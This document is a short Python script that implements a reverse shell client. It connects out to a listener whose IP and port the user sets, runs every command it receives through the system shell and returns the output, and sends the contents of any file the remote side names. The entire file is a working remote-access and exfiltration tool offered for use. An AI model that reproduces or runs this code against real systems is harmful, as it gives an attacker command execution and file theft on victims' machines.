#!/usr/bin/env python3
import socket
import subprocess
import os

SERVER_IP = "127.0.0.1"  # Change to your listener's IP
SERVER_PORT = 4444       # Change to your listener's port

def connect():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((SERVER_IP, SERVER_PORT))
        print(f"[*] Connected to {SERVER_IP}:{SERVER_PORT}")

        while True:
            data = client.recv(4096).decode()
            if not data:
                break

            # Exit session
            if data.lower() == "exit":
                break

            # Upload file (client -> server)
            elif data.startswith("upload "):
                file_path = data.split(" ", 1)[1]
                if os.path.exists(file_path):
                    with open(file_path, "rb") as f:
                        file_data = f.read()
                        client.sendall(file_data)
                    client.send(b"UPLOAD_COMPLETE")
                else:
                    client.send(b"File not found.")

            # Execute command
            else:
                try:
                    output = subprocess.getoutput(data)
                    client.send(output.encode() or b"No output")
                except Exception as e:
                    client.send(f"Error: {str(e)}".encode())

    except ConnectionRefusedError:
        print("[!] Connection refused. Is the listener running?")
    finally:
        client.close()

if __name__ == "__main__":
    connect()
